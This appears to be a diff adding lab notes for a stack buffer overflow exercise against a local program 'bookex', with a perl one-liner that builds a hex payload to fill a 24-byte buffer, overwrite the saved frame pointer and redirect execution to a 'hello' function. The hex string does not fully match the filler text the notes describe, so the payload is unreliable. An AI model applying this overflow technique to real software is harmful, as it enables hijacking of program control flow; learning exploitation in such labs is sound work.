@@ -1,0 +1,11 @@
+perl -e 'print pack("H*", "414243444546474748485155565758616263666775b9110000bd110000a4e4e4e4e0a");' | ./bookex
+
+24 Bytes of content to fill buffer
+Using ABCDEFGHQRSTUVWXabcdefgh
+
+Need to overwrite saved frame pointer, can be a semi arbitrary address near the stack: 0x000011ba 
+
+Address of hello function: 0x000011bd
+
+Perl to convert this hexadeciaml string to binary. 
+
